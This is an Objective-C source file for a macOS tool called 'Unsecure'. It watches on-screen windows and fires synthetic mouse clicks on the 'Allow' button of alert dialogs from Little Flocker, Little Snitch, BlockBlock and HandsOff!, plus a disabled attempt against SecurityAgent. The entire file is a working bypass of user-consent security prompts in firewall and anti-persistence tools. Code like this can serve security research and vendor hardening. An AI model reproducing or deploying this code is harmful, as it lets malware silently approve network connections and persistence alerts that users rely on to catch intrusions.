//
//  main.m
//  Unsecure
//
//  Created by Sabri on 22/12/2016.
//  Copyright © 2016 Sabri. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#import <IOKit/graphics/IOGraphicsLib.h>

void doEvent(CGPoint initialMousePosition, CGEventType event) {
    // Fire the event
    CGEventRef currentEvent = CGEventCreateMouseEvent(NULL, event, CGPointMake(initialMousePosition.x, initialMousePosition.y), kCGMouseButtonLeft);
    CGEventPost(kCGHIDEventTap, currentEvent);
    CFRelease(currentEvent);
}

void clickOnButton(CGPoint initialMousePosition, CGPoint oldLocation) {
    // Click at the desired position
    NSLog(@"Doing some magic...!\n");
    [NSThread sleepForTimeInterval:0.001];
    doEvent(initialMousePosition, kCGEventLeftMouseDown);
    doEvent(initialMousePosition, kCGEventLeftMouseUp);
    [NSThread sleepForTimeInterval:0.001];
    doEvent(CGPointMake(oldLocation.x, oldLocation.y), kCGEventLeftMouseUp);
    [NSThread sleepForTimeInterval:0.002];
}

int main(int argc, const char * argv[]) {
    
    // Don't really know if it's dirty or not, anyway we don't care
    while (1) {
        
        NSLog(@"Watching for new windows...\n");
        
        // Ask the window server for the list of windows.
        CFArrayRef windowList = CGWindowListCopyWindowInfo((kCGWindowListOptionOnScreenAboveWindow | kCGWindowListOptionIncludingWindow | kCGWindowListExcludeDesktopElements), kCGNullWindowID);
        NSMutableArray *datas = [(NSArray *) CFBridgingRelease(windowList) mutableCopy];
        
        // Get current location
        CGEventRef ourEvent         = CGEventCreate(NULL);
        CGPoint    oldLocation      = CGEventGetLocation(ourEvent);
        CFRelease(ourEvent);

        for(id element in datas) {

            NSString *kCGWindowName = [element objectForKey:@"kCGWindowName"];
            NSString *kCGWindowLayer = [element objectForKey:@"kCGWindowLayer"];
            NSString *kCGWindowOwnerName = [element objectForKey:@"kCGWindowOwnerName"];
            NSString *kCGWindowIsOnscreen = [element objectForKey:@"kCGWindowIsOnscreen"];
            NSArray *kCGWindowBounds = [element objectForKey:@"kCGWindowBounds"];
            
            //NSLog(@"%@", element);
            //continue;
            
            // Little Flocker (before 1.3.0) bypass
            if([kCGWindowOwnerName isEqualToString:@"Little Flocker"] && [kCGWindowLayer intValue] == 2147483631 && [kCGWindowIsOnscreen intValue] == 1) {

                // Window is present, click on the button "Allow"
                clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 666, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 280), oldLocation);
            }
            
            // Little Snitch bypass
            if([kCGWindowName isEqualToString:@"Little Snitch"] && [kCGWindowOwnerName isEqualToString:@"Little Snitch Agent"] && [kCGWindowLayer intValue] == 1490 && [kCGWindowIsOnscreen intValue] == 1) {
                
                // Window is present, click on the button "Allow"
                clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 587, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 340), oldLocation);
            }
            
            // BlockBlock bypass
            if([kCGWindowOwnerName isEqualToString:@"BlockBlock"] && [kCGWindowLayer intValue] == 3 && [kCGWindowIsOnscreen intValue] == 1) {
                
                // Window is present, click on the button "Allow"
                clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 634, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 319), oldLocation);
            }
            
            // HandsOff! bypass
            if([kCGWindowName isEqualToString:@"HandsOff"] && [kCGWindowOwnerName isEqualToString:@"HandsOffAgent"] && [kCGWindowIsOnscreen intValue] == 1) {
                
                // Window is present, click on the button "Allow"
                clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 503, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 275), oldLocation);
                [NSThread sleepForTimeInterval:1];
            }

            // SecurityAgent (not working since macOS do have a mitigation against this attack)
            /*if([kCGWindowOwnerName isEqualToString:@"SecurityAgent"] && [kCGWindowLayer intValue] == 1000 && [kCGWindowIsOnscreen intValue] == 1) {
             
             // Window is present, click on the button "Allow"
             clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 394, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 170), oldLocation);
             }*/
        }
        [NSThread sleepForTimeInterval:0.01];
    }

    return 0;
}
